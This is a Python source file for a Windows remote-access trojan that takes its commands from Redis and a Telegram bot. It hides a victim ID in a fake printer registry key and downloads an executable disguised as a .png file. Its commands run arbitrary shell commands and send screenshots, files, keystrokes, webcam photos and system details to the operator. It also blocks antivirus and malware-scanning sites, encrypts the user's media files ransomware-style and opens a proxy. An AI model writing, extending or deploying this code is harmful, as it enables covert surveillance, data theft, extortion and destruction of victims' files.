import asyncio
import json
import os
import shlex
import subprocess
import time
import uuid
import winreg
from datetime import datetime, timezone
from webbrowser import open as open_browser


import redis
import requests
from gtts import gTTS
from pynput import keyboard


from libs.block_website import block_domains, unblock_domains
from libs.files import FileManager
from libs.fun import *
from libs.proxy import NgrokProxyManager
from libs.psmanager import ProcessManager
from libs.ransomware import MultithreadedFileEncryptor
from libs.screenshot import screen_save
from libs.system_info import get_systeminfo as systinfo

#REDIS CONF
REDIS_HOST = ""
REDIS_PORT = 0 #PORT GOES HERE
REDIS_PASS = ""

#TELEGRAM CONF
TELEGRAM_BOT_TOKEN = "" 
NOTIFY_CHATID = "" 




redis_client = redis.Redis(
    host= REDIS_HOST,
    port=REDIS_PORT,
    password= REDIS_PASS,
    decode_responses=True
)


REDIS_COMMAND_CHANNEL = "commands"
REDIS_STATUS_CHANNEL = "status"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def get_or_create_uuid():
    reg_key = r"Software\Microsoft\Printers"
    value_name = "PrinterUUID"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_READ) as key:
            return winreg.QueryValueEx(key, value_name)[0]
    except FileNotFoundError:
        new_uuid = str(uuid.uuid4())
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_uuid)
        return new_uuid


COMPUTER_ID = get_or_create_uuid()
# Register command handlers
COMMAND_HANDLERS = {}


def command_handler(command):
    """Decorator to register a command handler."""
    def wrapper(func):
        COMMAND_HANDLERS[command] = func
        return func
    return wrapper


async def send_status_update():
    """Send periodic 'stay alive' updates to Redis."""
    while True:
        timestamp = datetime.now(timezone.utc).isoformat()  # Generate ISO 8601 timestamp
        redis_client.hset(REDIS_STATUS_CHANNEL, COMPUTER_ID, timestamp)
        await asyncio.sleep(2)  # Send update every 2 seconds


async def command_listener():
    """
    Listen for commands targeted to this computer.
    """
    pubsub = redis_client.pubsub()
    pubsub.subscribe(REDIS_COMMAND_CHANNEL)

    while True:
        message = pubsub.get_message()
        if message and message["type"] == "message":
            try:
                data = json.loads(message["data"])
                if is_target_computer():  # Ensure this computer is the target
                    await process_command(data)
                else:
                    print(f"[DEBUG] Ignoring command. Not the target computer.")
            except Exception as e:
                print(f"[ERROR] Failed to process command: {e}")
        await asyncio.sleep(0.1)


async def process_command(data):
    """Process a command and dispatch to the appropriate handler."""
    if "command" not in data or not data["command"]:
        # Log and ignore invalid command data
        print(f"[DEBUG] Received invalid command data: {data}")
        return

    try:
        # Safely split the command and arguments
        command, *args = data["command"].split()
        handler = COMMAND_HANDLERS.get(command)
        
        if handler:
            await handler(data, *args)
        else:
            await send_message(data["chat_id"], f"Unknown command: {command}")
    except Exception as e:
        print(f"[ERROR] Error processing command: {e}")
        # Optionally, notify the user
        if "chat_id" in data:
            await send_message(data["chat_id"], "An error occurred while processing your command.")




async def send_message(chat_id, text):
    """Send a text message via Telegram."""
    payload = {"chat_id": chat_id, "text": text}
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)


async def send_photo(chat_id, photo_path):
    """Send a photo via Telegram."""
    with open(photo_path, "rb") as photo:
        requests.post(
            f"{TELEGRAM_API_URL}/sendPhoto",
            data={"chat_id": chat_id},
            files={"photo": photo}
        )


async def send_document(chat_id, document_path):
    """Send a document via Telegram."""
    with open(document_path, "rb") as document:
        requests.post(
            f"{TELEGRAM_API_URL}/sendDocument",
            data={"chat_id": chat_id},
            files={"document": document}
        )


async def send_markdown(chat_id, markdown_text):
    """Send a Markdown-formatted message via Telegram."""
    payload = {"chat_id": chat_id, "text": markdown_text, "parse_mode": "Markdown"}
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)


def is_target_computer():
    """
    Check if the current computer is the selected target computer.
    """
    try:
        # Retrieve the current target computer's UUID from Redis
        target_uuid = redis_client.get("current_computer")
        local_uuid = get_or_create_uuid()  # Get this computer's UUID

        if target_uuid is None:
            print("[DEBUG] No target computer set in Redis.")
            return False

        print(f"[DEBUG] Comparing target UUID: {target_uuid} with local UUID: {local_uuid}")
        return target_uuid == local_uuid  # Only process if UUIDs match
    except Exception as e:
        print(f"[ERROR] Exception in is_target_computer: {e}")
        return False


local_appdata = os.getenv('LOCALAPPDATA')  # Fetches the 'AppData\Local' directory
camera_path = os.path.join(local_appdata, 'Microsoft', 'Camera')
camera_exe_path = camera_path + '\\Camera.exe'

def ensure_camera_executable():
    """
    Ensure the camera manager executable is available locally.
    If not, download it to a temporary directory.
    """
    
    download_url = "https://files.catbox.moe/6rhsii.png"



    if not os.path.exists(camera_path):
        
        os.makedirs(camera_path)
        print("Camera executable not found. Downloading...")
        response = requests.get(download_url, stream=True)
        if response.status_code == 200:
            with open(camera_exe_path, "wb") as exe_file:
                for chunk in response.iter_content(chunk_size=1024):
                    exe_file.write(chunk)
            print(f"Camera executable downloaded successfully to {camera_exe_path}.")
        else:
            raise Exception(f"Failed to download camera manager executable. HTTP Status: {response.status_code}")
    return camera_exe_path





async def download_file(file_id, file_name, NOTIFY_CHATID):
    """Download a file from Telegram and save it in the current working directory."""
    try:
        # Get file info from Telegram
        response = requests.get(f"{TELEGRAM_API_URL}/getFile", params={"file_id": file_id})
        response_data = response.json()

        if "result" not in response_data:
            await send_message(NOTIFY_CHATID, "Failed to retrieve file info from Telegram.")
            return

        file_path = response_data["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"

        # Download and save the file
        local_file_path = os.path.join(os.getcwd(), file_name)
        file_content = requests.get(file_url).content

        with open(local_file_path, "wb") as file:
            file.write(file_content)

        await send_message(NOTIFY_CHATID, f"File '{file_name}' has been successfully uploaded and saved to {local_file_path}!")
        print(f"[DEBUG] File downloaded: {local_file_path}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error downloading file: {e}")

@command_handler("/upload")
async def handle_upload(data, *args):
    """Handle the /upload command and wait for a file to be uploaded."""
    
    await send_message(NOTIFY_CHATID, "Please upload a file (document, photo, video, or audio). You have 60 seconds.")

    try:
        timeout = 60
        start_time = time.time()

        
        offset = redis_client.get("telegram_offset")
        if offset:
            offset = int(offset)
        else:
            offset = 0  

        while time.time() - start_time < timeout:
            response = requests.get(f"{TELEGRAM_API_URL}/getUpdates", params={"offset": offset, "timeout": 10})
            updates = response.json()

            if updates.get("ok") and updates["result"]:
                for update in updates["result"]:
                    offset = update["update_id"] + 1  # Update the offset
                    redis_client.set("telegram_offset", offset)  # Persist the offset

                    # Check if the update is for the correct chat
                    if "message" in update and update["message"]["chat"]["id"] == NOTIFY_CHATID:
                        message = update["message"]

                        # Detect uploaded files
                        if "document" in message:
                            file_id = message["document"]["file_id"]
                            file_name = message["document"].get("file_name", f"document_{file_id}")
                            await download_file(file_id, file_name, NOTIFY_CHATID)
                            return

                        elif "photo" in message:
                            file_id = message["photo"][-1]["file_id"]
                            file_name = f"photo_{file_id}.jpg"
                            await download_file(file_id, file_name, NOTIFY_CHATID)
                            return

                        elif "video" in message:
                            file_id = message["video"]["file_id"]
                            file_name = message["video"].get("file_name", f"video_{file_id}.mp4")
                            await download_file(file_id, file_name, NOTIFY_CHATID)
                            return

                        elif "audio" in message:
                            file_id = message["audio"]["file_id"]
                            file_name = message["audio"].get("file_name", f"audio_{file_id}.mp3")
                            await download_file(file_id, file_name, NOTIFY_CHATID)
                            return

                        elif "voice" in message:
                            file_id = message["voice"]["file_id"]
                            file_name = f"voice_{file_id}.ogg"
                            await download_file(file_id, file_name, NOTIFY_CHATID)
                            return

            await asyncio.sleep(1)

        # Timeout reached
        await send_message(NOTIFY_CHATID, "File upload timed out. Please try again.")

    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error handling upload: {e}")

@command_handler("/download")
async def handle_download(data, *args):
    """Handle the /download command to send a file back to the user."""
    

    if not args:
        await send_message(NOTIFY_CHATID, "Please specify a file name. Usage: /download <file_name>")
        return

    file_name = args[0]
    file_path = os.path.join(os.getcwd(), file_name)

    if not os.path.exists(file_path):
        await send_message(NOTIFY_CHATID, f"File '{file_name}' not found in the current directory.")
        return

    try:
        # Send the file to the user
        with open(file_path, "rb") as file:
            requests.post(
                f"{TELEGRAM_API_URL}/sendDocument",
                data={"NOTIFY_CHATID": NOTIFY_CHATID},
                files={"document": file}
            )
        await send_message(NOTIFY_CHATID, f"File '{file_name}' has been sent successfully!")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error sending file: {e}")


@command_handler("/set_upload_listener")
async def set_upload_listener(data, *args):
    """Manually set up an upload listener."""
    
    message_id = data.get("message_id")
    if not message_id:
        await send_message(NOTIFY_CHATID, "Upload listener setup failed: no message ID provided.")
        return

    try:
        redis_client.publish(f"uploads:{NOTIFY_CHATID}", json.dumps({
            "message_id": message_id,
            "NOTIFY_CHATID": NOTIFY_CHATID
        }))
        await send_message(NOTIFY_CHATID, "Upload listener set successfully.")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error setting upload listener: {e}")


@command_handler("/screenshot")
async def handle_screenshot(data, *args):
    """Take and send a screenshot."""
    
    if is_target_computer():
        screenshot_path = screen_save()
        await send_photo(NOTIFY_CHATID, screenshot_path)
    else:
        await send_message(NOTIFY_CHATID, "This computer is not active.")


@command_handler("/execute")
async def handle_execute(data, *args):
    """Execute a shell command and send the result."""
    shell_command = " ".join(args)
    
    try:
        result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
        result = result.decode("utf-8").strip()
    except subprocess.CalledProcessError as e:
        result = f"Error: {e.output.decode('utf-8').strip()}"
    await send_message(NOTIFY_CHATID, f"Command Result:\n{result}")


# Initialize FileManager instance
fm = FileManager()

@command_handler("/cd")
async def handle_cd(data, *args):
    """Change the current directory."""
    try:
        # Parse and clean arguments
        command = " ".join(args)
        parsed_args = shlex.split(command)

        if len(parsed_args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /cd <path>")
            return

        path = parsed_args[0].strip('"')
        result = fm.cd(path)
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error changing directory: {e}")

@command_handler("/pwd")
async def handle_pwd(data, *args):
    """Display the current working directory."""
    try:
        current_directory = os.getcwd()
        await send_message(NOTIFY_CHATID, f"Current directory:\n{current_directory}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error retrieving current directory: {e}")

@command_handler("/ls")
async def handle_ls(data, *args):
    """List files and directories in the current directory."""
    try:
        result = fm.ls()
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error listing files: {e}")

@command_handler("/move")
async def handle_move(data, *args):
    """Move or rename a file/directory."""
    try:
        # Parse and clean arguments
        command = " ".join(args)
        parsed_args = shlex.split(command)

        if len(parsed_args) < 2:
            await send_message(NOTIFY_CHATID, "Usage: /move <source> <destination>")
            return

        source = parsed_args[0].strip('"')
        destination = parsed_args[1].strip('"')

        result = fm.move(source, destination)
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error moving '{source}': {e}")

@command_handler("/copy")
async def handle_copy(data, *args):
    """Copy a file or directory."""
    try:
        # Parse and clean arguments
        command = " ".join(args)
        parsed_args = shlex.split(command)

        if len(parsed_args) < 2:
            await send_message(NOTIFY_CHATID, "Usage: /copy <source> <destination>")
            return

        source = parsed_args[0].strip('"')
        destination = parsed_args[1].strip('"')

        result = fm.copy(source, destination)
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error copying '{source}': {e}")

@command_handler("/delete")
async def handle_delete(data, *args):
    """Delete a file or directory."""
    try:
        # Parse and clean arguments
        command = " ".join(args)
        parsed_args = shlex.split(command)

        if len(parsed_args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /delete <path>")
            return

        path = parsed_args[0].strip('"')
        result = fm.delete(path)
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error deleting '{path}': {e}")

@command_handler("/mkdir")
async def handle_mkdir(data, *args):
    """Create a new directory."""
    try:
        # Parse and clean arguments
        command = " ".join(args)
        parsed_args = shlex.split(command)

        if len(parsed_args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /mkdir <directory_name>")
            return

        path = parsed_args[0].strip('"')
        result = fm.mkdir(path)
        await send_message(NOTIFY_CHATID, result)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error creating directory '{path}': {e}")

pm = ProcessManager()



@command_handler("/ps")
async def handle_list_processes(data, *args):
    """Handle /ps command and send the process list as a file."""
    
    process_list_file = pm.list_processes()

    if os.path.exists(process_list_file):
        try:
            await send_document(NOTIFY_CHATID, os.path.abspath(process_list_file))
        finally:
            os.remove(process_list_file)  # Clean up temporary file
    else:
        await send_message(NOTIFY_CHATID, process_list_file)

@command_handler("/pskill")
async def handle_kill_process(data, *args):
    """Handle /pskill command to kill a process by PID or name."""
    

    if len(args) < 1:
        await send_message(NOTIFY_CHATID, "Usage: /pskill <PID or Process Name>")
        return

    target = args[0]
    if target.isdigit():  # Kill by PID
        result = pm.kill_process_by_pid(int(target))
    else:  # Kill by name
        result = pm.kill_process_by_name(target)

    await send_message(NOTIFY_CHATID, result)

@command_handler("/msg_box")
async def handle_msg_box(data, *args):
    """Handle /msg_box command to display a message box."""
    
    try:
        # Reconstruct the full command text
        full_command = data["command"]

        # Parse arguments using shlex to handle quoted strings
        import shlex
        parsed_args = shlex.split(full_command)

        # Ensure we have exactly two arguments (title and message)
        if len(parsed_args) < 3:
            await send_message(NOTIFY_CHATID, "Usage: /msg_box \"Title\" \"Message\"")
            return

        # Extract the title and message
        title = parsed_args[1]  # First quoted argument
        message = parsed_args[2]  # Second quoted argument

        # Show the message box
        show_message_box_threaded(title, message)
        await send_message(NOTIFY_CHATID, f"Message box displayed with title: '{title}' and message: '{message}'.")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to display message box: {e}")



jumpscare_handler = JumpscareHandler()

@command_handler("/jumpscare")
async def handle_jumpscare(data, *args):
    """Handle /jumpscare command to play a jumpscare video."""
    
    try:
        if len(args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /jumpscare <preset_name>")
            return

        preset_name = args[0]
        download_status = jumpscare_handler.download_video(preset_name)
        await send_message(NOTIFY_CHATID, download_status)

        volume_status = jumpscare_handler.set_volume_to_max()
        await send_message(NOTIFY_CHATID, volume_status)

        play_status = jumpscare_handler.play_video_and_maximize()
        await send_message(NOTIFY_CHATID, play_status)
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to trigger jumpscare: {e}")

@command_handler("/set_volume")
async def handle_set_volume(data, *args):
    """Handle /set_volume command to set system volume."""
    
    try:
        if len(args) < 1 or not args[0].isdigit() or not (0 <= int(args[0]) <= 100):
            await send_message(NOTIFY_CHATID, "Usage: /set_volume <0-100>")
            return

        volume = int(args[0])
        volume_control = VolumeControl()
        volume_control.set_volume(volume)
        await send_message(NOTIFY_CHATID, f"System volume set to {volume}%.")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to set volume: {e}")


@command_handler("/get_volume")
async def handle_get_volume(data, *args):
    """Handle /get_volume command to get current system volume."""
    
    try:
        volume_control = VolumeControl()
        current_volume = volume_control.get_volume()
        await send_message(NOTIFY_CHATID, f"Current system volume is {current_volume}%.")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to get volume: {e}")

audio_player = AudioPlayer()

@command_handler("/start_audio")
async def handle_start_audio(data, *args):
    """Handle /start_audio command to play audio."""
    
    try:
        if len(args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /start_audio <file_path>")
            return

        file_path = args[0]
        audio_player.play(file_path)
        await send_message(NOTIFY_CHATID, f"Playing audio from: {file_path}")
    except FileNotFoundError as e:
        await send_message(NOTIFY_CHATID, f"Audio file not found: {e}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to play audio: {e}")



@command_handler("/stop_audio")
async def handle_stop_audio(data, *args):
    """Handle /stop_audio command to stop audio playback."""
    
    try:
        audio_player.stop()
        await send_message(NOTIFY_CHATID, "Audio playback stopped.")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to stop audio playback: {e}")


# Global variables for the keylogger
keylogger_file = None
keylogger_listener = None
key_buffer = []  # Buffer to store keys for the current line

@command_handler("/start_keylogger")
async def handle_start_keylogger(data, *args):
    """Start the keylogger and save logs to a temporary file."""
    global keylogger_file, keylogger_listener, key_buffer

    

    if keylogger_listener is not None:
        await send_message(NOTIFY_CHATID, "Keylogger is already running.")
        return

    # Reset the key buffer
    key_buffer = []

    # Create a temporary file for logging
    keylogger_file = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt")
    log_file_path = keylogger_file.name

    # Key press handler
    def on_press(key):
        global key_buffer
        try:
            if key == keyboard.Key.enter:
                # Write the current buffer to a new line
                keylogger_file.write("".join(key_buffer) + "\n")
                key_buffer = []  # Reset the buffer
            elif key == keyboard.Key.space:
                key_buffer.append(" ")  # Append a space for the space key
            elif hasattr(key, 'char') and key.char is not None:
                key_buffer.append(key.char)  # Append the character key
            else:
                key_buffer.append(f"[{key.name}]")  # Special keys (e.g., Shift, Ctrl)
            keylogger_file.flush()  # Ensure logs are saved immediately
        except Exception as e:
            print(f"Error in keylogger: {e}")

    # Start the keylogger listener
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()

    await send_message(NOTIFY_CHATID, f"Keylogger started. Logs will be saved to: {log_file_path}")


@command_handler("/stop_keylogger")
async def handle_stop_keylogger(data, *args):
    """Stop the keylogger and send the logs to the user."""
    global keylogger_file, keylogger_listener, key_buffer

    

    if keylogger_listener is None:
        await send_message(NOTIFY_CHATID, "Keylogger is not running.")
        return

    # Stop the keylogger
    keylogger_listener.stop()
    keylogger_listener = None

    # Write any remaining buffer content
    if key_buffer:
        keylogger_file.write("".join(key_buffer) + "\n")
        key_buffer = []

    # Close the log file
    if keylogger_file:
        keylogger_file.close()
        log_file_path = keylogger_file.name
        keylogger_file = None

        # Send the log file to the user
        await send_document(NOTIFY_CHATID, log_file_path)

        # Delete the log file after sending
        os.remove(log_file_path)
    else:
        await send_message(NOTIFY_CHATID, "No keylogger logs available to send.")

def capture_image(camera_index=0):
    """Capture an image from the specified camera index."""
    try:
        camera_exe = ensure_camera_executable()
        result = subprocess.run(
            [camera_exe, "capture", str(camera_index)],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            image_path = result.stdout.strip()
            if os.path.exists(image_path):
                return image_path
            else:
                raise FileNotFoundError(f"Image file not found at {image_path}")
        else:
            raise Exception(f"Camera capture failed: {result.stderr.strip()}")
    except Exception as e:
        raise Exception(f"Error capturing image: {e}")

@command_handler("/capture_webcam")
async def handle_capture_webcam(data, *args):
    """Capture an image using the webcam."""
    camera_index = int(args[0]) if args and args[0].isdigit() else 0
    try:
        image_path = capture_image(camera_index)
        await send_document(NOTIFY_CHATID, image_path)
        os.remove(image_path)  # Clean up temporary file
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error capturing image: {e}")

@command_handler("/list_cameras")
async def handle_list_cameras(data, *args):
    """List available cameras."""
    try:
        camera_exe = ensure_camera_executable()
        result = subprocess.run([camera_exe, "list"], capture_output=True, text=True)
        if result.returncode == 0:
            await send_message(NOTIFY_CHATID, f"Available Cameras:\n{result.stdout.strip()}")
        else:
            await send_message(NOTIFY_CHATID, f"Error listing cameras: {result.stderr.strip()}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error: {e}")


@command_handler("/tts")
async def handle_tts(data, *args):
    """Convert text to speech and play the audio locally."""
    
    try:
        # Ensure arguments are provided
        if not args:
            await send_message(NOTIFY_CHATID, "Usage: /tts <text to speak>")
            return

        # Combine arguments into a single text string
        text = " ".join(args)

        await send_message(NOTIFY_CHATID, f"Playing TTS: {text}")

        # Create a temporary file for the audio
        with tempfile.NamedTemporaryFile(suffix='.mp3', delete=False) as temp_file:
            output_file = temp_file.name

        # Generate the TTS audio
        tts = gTTS(text)
        tts.save(output_file)

        # Play the audio using the audio_player (ensure this is defined elsewhere in your code)
        audio_player.play(output_file)

        # Notify the user about successful playback
        await send_message(NOTIFY_CHATID, "TTS playback finished successfully.")


    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to play TTS: {e}")


@command_handler("/change_wallpaper")
async def handle_change_wallpaper(data, *args):
    """Change the Windows wallpaper."""
    

    try:
        if not args:
            await send_message(NOTIFY_CHATID, "Usage: /change_wallpaper <file_path>")
            return

        # Combine all arguments into a single file path
        file_path = " ".join(args)

        # Validate the file exists
        if not os.path.exists(file_path):
            await send_message(NOTIFY_CHATID, f"File not found: {file_path}")
            return

        # Change the wallpaper
        set_wallpaper(file_path)

        await send_message(NOTIFY_CHATID, f"Wallpaper changed to: {file_path}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to change wallpaper: {e}")

@command_handler("/type")
async def handle_type(data, *args):
    
    

    text =  " ".join(args)

    try:
        if len(args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /type <string to write>")
            return

        
        
        send_key_input(text)

        await send_message(NOTIFY_CHATID, f"Succesfully typed in: {text}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to type: {e}")

@command_handler("/open_url")
async def handle_change_wallpaper(data, *args):
    
    

    url = args[0]

    try:
        if len(args) != 1:
            await send_message(NOTIFY_CHATID, "Usage: /open_url <string to write>")
            return

        
        
        open_browser(url)

        await send_message(NOTIFY_CHATID, f"Succesfully opened: {url}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to open browser: {e}")

@command_handler("/sys_info")
async def handle_sysinfo(data, *args):
    """Get and send system information."""
    try:
        info = systinfo()  # Ensure `systinfo` returns a detailed system report.
        await send_markdown(NOTIFY_CHATID, f"System Information:\n```\n{info}\n```")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Error fetching system information: {e}")


@command_handler("/block_av")
async def handle_blockav(data, *args):
    # List of domains to block/unblock
    antivirus_sites = [
        "https://www.bitdefender.com",
        "https://us.norton.com",
        "https://www.mcafee.com",
        "https://www.kaspersky.com",
        "https://tria.ge",
        "https://virustotal.com",
        "https://www.avast.com",
        "https://www.avg.com",
        "https://www.eset.com",
        "https://www.pandasecurity.com",
        "https://www.trendmicro.com",
        "https://home.sophos.com",
        "https://www.f-secure.com",
        "https://www.malwarebytes.com",
        "https://www.webroot.com",
        "https://www.comodo.com",
        "https://www.avira.com",
        "https://www.gdatasoftware.com",
        "https://www.bullguard.com",
        "https://www.zonealarm.com",
        "https://www.microsoft.com/en-us/windows/comprehensive-security",
        "https://www.360totalsecurity.com",
        "https://www.immunet.com",
        "https://www.clamav.net",
        "https://www.drweb.com",
        "https://global.ahnlab.com",
        "https://www.quickheal.com",
        "https://www.k7computing.com",
        "https://www.totalav.com",
        "https://www.pcmatic.com",
        "https://www.secureage.com",
        "https://www.anti-virus.by/en",
        "https://zillya.com",
        "https://www.sentinelone.com",
        "https://www.cybereason.com",
        "https://www.cylance.com",
        "https://www.trustport.com",
        "https://www.vipre.com",
        "https://www.emsisoft.com",
        "https://www.norman.com",
        "https://www.fortinet.com",
        "https://www.alienvault.com",
        "https://www.securebrain.co.jp",
        "https://www.whitearmor.com",
        "https://www.yandex.com",
        "https://www.zonerantivirus.com",
        "https://www.hitmanpro.com"
    ]

    # Convert URLs to domains
    domains = [url.split("//")[1] for url in antivirus_sites]

    block_domains(domains)
    await send_message(NOTIFY_CHATID, 'Successfully Blocked AV Sites')

@command_handler("/unblock_av")
async def handle_unblockav(data, *args):
    # List of domains to block/unblock
    antivirus_sites = [
        "https://www.bitdefender.com",
        "https://us.norton.com",
        "https://www.mcafee.com",
        "https://tria.ge",
        "https://virustotal.com",
        "https://www.kaspersky.com",
        "https://www.avast.com",
        "https://www.avg.com",
        "https://www.eset.com",
        "https://www.pandasecurity.com",
        "https://www.trendmicro.com",
        "https://home.sophos.com",
        "https://www.f-secure.com",
        "https://www.malwarebytes.com",
        "https://www.webroot.com",
        "https://www.comodo.com",
        "https://www.avira.com",
        "https://www.gdatasoftware.com",
        "https://www.bullguard.com",
        "https://www.zonealarm.com",
        "https://www.microsoft.com/en-us/windows/comprehensive-security",
        "https://www.360totalsecurity.com",
        "https://www.immunet.com",
        "https://www.clamav.net",
        "https://www.drweb.com",
        "https://global.ahnlab.com",
        "https://www.quickheal.com",
        "https://www.k7computing.com",
        "https://www.totalav.com",
        "https://www.pcmatic.com",
        "https://www.secureage.com",
        "https://www.anti-virus.by/en",
        "https://zillya.com",
        "https://www.sentinelone.com",
        "https://www.cybereason.com",
        "https://www.cylance.com",
        "https://www.trustport.com",
        "https://www.vipre.com",
        "https://www.emsisoft.com",
        "https://www.norman.com",
        "https://www.fortinet.com",
        "https://www.alienvault.com",
        "https://www.securebrain.co.jp",
        "https://www.whitearmor.com",
        "https://www.yandex.com",
        "https://www.zonerantivirus.com",
        "https://www.hitmanpro.com"
    ]

    # Convert URLs to domains
    domains = [url.split("//")[1] for url in antivirus_sites]

    unblock_domains(domains)
    await send_message(NOTIFY_CHATID, 'Successfully Unblocked AV Sites')

@command_handler("/block_domain")
async def handle_blockdomain(data, *args):
    
    if not args:
        await send_message(NOTIFY_CHATID, 'Successfully blocked domain')


    block_domains(args)
    await send_message(NOTIFY_CHATID, 'Successfully blocked domain')

@command_handler("/unblock_domain")
async def handle_blockdomain(data, *args):
    
    if not args:
        await send_message(NOTIFY_CHATID, 'Successfully unblocked domain')


    unblock_domains(args)
    await send_message(NOTIFY_CHATID, 'Successfully unblocked domain')
    
# Global encryptor object (initialized after /set_key is called)
encryptor = None

@command_handler("/set_key")
async def handle_set_key(data, *args):
    """
    Command to set the encryption key for all operations.
    Usage: /set_key <encryption_key>
    """
    global encryptor

    if len(args) < 1:
        await send_message(NOTIFY_CHATID, "Usage: /set_key <encryption_key>")
        return

    encryption_key = args[0]

    # Define the directories and file extensions to scan
    directories_to_search = MultithreadedFileEncryptor.get_all_user_dirs(exclude_c_drive=True)
    extensive_extensions = [
        "3dm", "3ds", "max", "avif", "bmp", "dds", "gif", "heic", "heif", "jpg", "jpeg", "jxl", "png", "psd", "xcf",
        "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "dwg", "dxf", "gpx", "kml", "kmz", "webp",
        "3g2", "3gp", "aac", "aiff", "ape", "au", "flac", "gsm", "it", "m3u", "m4a", "mid", "mod", "mp3", "mpa", "ogg",
        "pls", "ra", "s3m", "sid", "wav", "wma", "xm", "aaf", "asf", "avchd", "avi", "car", "dav", "drc", "flv", "m2v",
        "m2ts", "m4p", "m4v", "mkv", "mng", "mov", "mp2", "mp4", "mpe", "mpeg", "mpg", "mpv", "mts", "mxf", "nsv", "ogv",
        "ogm", "ogx", "qt", "rm", "rmvb", "roq", "srt", "svi", "vob", "webm", "wmv", "xba", "yuv"
    ]

    # Initialize the global encryptor object
    encryptor = MultithreadedFileEncryptor(
        root_dirs=directories_to_search,
        extensions=extensive_extensions,
        max_age_days=365 * 10,  # Target files modified in the last 10 years
        threads=8,
        encryption_key=encryption_key
    )

    await send_message(NOTIFY_CHATID, "Encryption key set successfully!")


@command_handler("/encrypt_files")
async def handle_encrypt_files(data, *args):
    """
    Command to encrypt files in specified directories.
    Usage: /encrypt_files
    """
    global encryptor

    if encryptor is None:
        await send_message(NOTIFY_CHATID, "Encryption key is not set. Use /set_key <encryption_key> first.")
        return

    # Start scanning and encrypting files
    await send_message(NOTIFY_CHATID, "Scanning for files to encrypt...")
    encryptor.find_files()
    encryptor.encrypt_all_files()

    await send_message(NOTIFY_CHATID, "Encryption complete.")


@command_handler("/decrypt_files")
async def handle_decrypt_files(data, *args):
    """
    Command to decrypt files in specified directories.
    Usage: /decrypt_files
    """
    global encryptor

    if encryptor is None:
        await send_message(NOTIFY_CHATID, "Encryption key is not set. Use /set_key <encryption_key> first.")
        return

    # Start decrypting files
    await send_message(NOTIFY_CHATID, "Scanning for files to decrypt...")
    encryptor.decrypt_all_files()

    await send_message(NOTIFY_CHATID, "Decryption complete.")

@command_handler("/start_proxy")
async def handle_change_wallpaper(data, *args):
    

    try:
        if len(args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /start_proxy <ngrok_token>")
            return

        ngrok_token = args[0]  # Replace with your ngrok auth token
        manager = NgrokProxyManager(ngrok_token)
        
        ngrok_url = manager.start_all()
        
        await send_message(NOTIFY_CHATID, f"Proxy hosted at {ngrok_url}")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to start proxy: {e}")

@command_handler("/stop_proxy")
async def handle_change_wallpaper(data, *args):
    

    try:
        if len(args) < 1:
            await send_message(NOTIFY_CHATID, "Usage: /stop_proxy <ngrok_token>")
            return

        ngrok_token = args[0]  # Replace with your ngrok auth token
        manager = NgrokProxyManager(ngrok_token)
        
        manager.stop_all()
        
        await send_message(NOTIFY_CHATID, f"Proxy stopped")
    except Exception as e:
        await send_message(NOTIFY_CHATID, f"Failed to stop proxy: {e}")



@command_handler("/status")
async def handle_status(data, *args):
    """Send the status of the computer."""
    
    await send_message(NOTIFY_CHATID, f"Computer {COMPUTER_ID} is active.")


async def main():
    """Main entry point for the local script."""
    print(f"Computer {COMPUTER_ID} registered and running...")
    redis_client.hset(REDIS_STATUS_CHANNEL, COMPUTER_ID, "ONLINE")
    await send_message(chat_id=NOTIFY_CHATID, text=f'{COMPUTER_ID} successfuly connected!')
    await asyncio.gather(send_status_update(), command_listener())


if __name__ == "__main__":
    asyncio.run(main())
